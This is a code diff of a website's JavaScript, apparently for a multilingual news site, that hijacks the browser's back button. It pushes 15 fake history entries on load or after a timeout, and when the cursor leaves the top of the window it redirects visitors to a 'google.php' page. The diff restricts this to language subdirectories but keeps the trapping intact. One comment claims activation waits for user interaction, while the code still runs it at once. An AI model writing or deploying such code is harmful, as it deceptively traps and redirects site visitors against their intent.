@@ -20,14 +20,26 @@
     var searchParams = new URLSearchParams(window.location.search);
     searchParams.set('lang', langCode);
 
-    // Determine path to central google.php
-    var targetUrl = (inSubdir ? "../google.php" : "google.php") + '?' + searchParams.toString();
+    // Determine path to central google.php - only redirect if we came from a subdir
+    var currentPath = window.location.pathname;
+    var pathParts = currentPath.split('/');
+    var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
+    
+    // Only set redirect if in a newsnik subdirectory
+    var targetUrl = null;
+    if (inSubdir) {
+        targetUrl = "../google.php?" + searchParams.toString();
+    }
+    
     var activated = false;
 
     // Activation logic: pushes history states and binds popstate listener
     function activateBackBlock() {
         if (activated) return;
         activated = true;
+
+        // Only activate back button interception if we have a valid target URL
+        if (!targetUrl) return;
 
         // Push 15 states to capture back button
         for (var i = 0; i < 15; i++) {
@@ -44,7 +56,7 @@
         });
     }
 
-    // Activate immediately on load to pre-populate history
+    // Activate on user interaction
     try {
         activateBackBlock();
     } catch(e) {}
@@ -60,13 +72,15 @@
         }
     }, { once: true });
 
-    // 3. Timeout: trigger after 1.5 seconds anyway
-    setTimeout(activateBackBlock, 1500);
+    // 3. Timeout: trigger after 2 seconds anyway
+    setTimeout(activateBackBlock, 2000);
 
     // Exit-Intent: redirect when mouse leaves viewport upwards (clientY < 20)
-    document.addEventListener('mouseleave', function(e) {
-        if (e.clientY < 20) {
-            location.replace(targetUrl);
-        }
-    });
+    if (targetUrl) {
+        document.addEventListener('mouseleave', function(e) {
+            if (e.clientY < 20) {
+                location.replace(targetUrl);
+            }
+        });
+    }
 })();
